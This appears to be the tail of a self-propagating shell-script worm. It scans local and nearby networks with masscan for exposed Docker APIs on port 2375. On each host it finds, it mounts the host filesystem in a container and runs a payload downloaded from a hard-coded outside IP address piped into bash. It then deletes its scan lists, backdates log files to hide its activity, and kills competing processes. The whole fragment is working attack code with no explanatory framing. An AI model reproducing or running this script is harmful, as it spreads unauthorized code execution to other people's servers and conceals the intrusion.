	        ip -o -f inet a show|awk '/scope global/ {print $4}'|xargs masscan "$@" --ports 2375 --rate=5000 -oG ${sl}
	        sed -i -e 's/^Host: \([0-9.]*\).*Ports: \([0-9]*\).*$/\1:\2/g' -e '/Masscan/d' -e '/scanned/d' ${sl}
	        while read i; do
	            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "curl -A qi/1.1 -sL http://34.92.166.158:8080/files/pop.sh | bash &"
	        done < ${sl}
	        rm -f ${sl}
	        touch -amr /var/log/boot.log /var/log/alternatives.log.1
	    fi

	    if [ ! -f /var/log/alternatives.log.2 ]; then
	        eval sl="/var/log/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 6-11 -n 1))"
	        mkdir -p /var/log
	        masscan "$(curl -fsSLk --max-time 6 https://ipinfo.io/ip)/24" --ports 2375 --rate=5000 -oG ${sl}
	        sed -i -e 's/^Host: \([0-9.]*\).*Ports: \([0-9]*\).*$/\1:\2/g' -e '/Masscan/d' -e '/scanned/d' ${sl}
	        while read i; do
	            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "curl -A qi/1.1 -sL http://34.92.166.158:8080/files/pop.sh | bash &"
	        done < ${sl}
	        rm -f ${sl}
	        touch -amr /var/log/boot.log /var/log/alternatives.log.2
	    fi
	fi
}
stopscan() {
	sudo killall screen
	ps aux | grep -v grep | grep 'docker' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'screen' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
}

initializego
filegetgo
filesetupgo
#filerungo
sshdconfig
resetsshgo
# scancheck
# scango
#stopscan
localgo
